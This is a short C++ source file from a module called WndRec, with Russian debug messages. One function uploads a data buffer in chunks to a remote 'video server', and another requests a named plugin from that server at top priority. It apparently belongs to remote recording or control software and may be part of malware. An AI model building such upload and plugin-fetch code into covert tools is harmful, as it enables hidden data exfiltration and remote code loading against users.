#include "WndRec\file.h"
#include "WndRec\manager.h"
#include "core\debug.h"

namespace WndRec
{

bool SendFile( ServerData* server, const char* typeName, const char* fileName, const char* ext, const void* data, int c_data )
{
	DbgMsg( "Отправка файла на видео-сервер: %s\\%s.%s", typeName, fileName, ext );
	int id = CreateStream( server, STREAM_FILE, typeName, fileName, ext, 10000 );
	if( id == 0 ) return false;
	int p = 0;
	while( p < c_data )
	{
		int sz = MinSizePackage;
		if( p + sz > c_data ) sz = c_data - p;
		WriteStream( server, id, (byte*)data + p, sz );
		p += sz;
	}
	CloseStream(server, id);
	return true;
}

uint LoadPluginAsync( ServerData* server, const char* namePlugin)
{
	if( server == 0 ) return 0;
	int len = Str::Len(namePlugin);
	if( len == 0 ) return 0;
	Package* p = AllocPackage( server, len + 1 );
	if( p  == 0 ) return 0;
	p->data.SetLen( len + 1 );
	p->data.p_byte()[0] = len;
	p->data.Copy( 1, namePlugin, len );
	return WritePackage( server, ID_PLUGIN, p, 4 ); //самый высокий приоритет
}

}
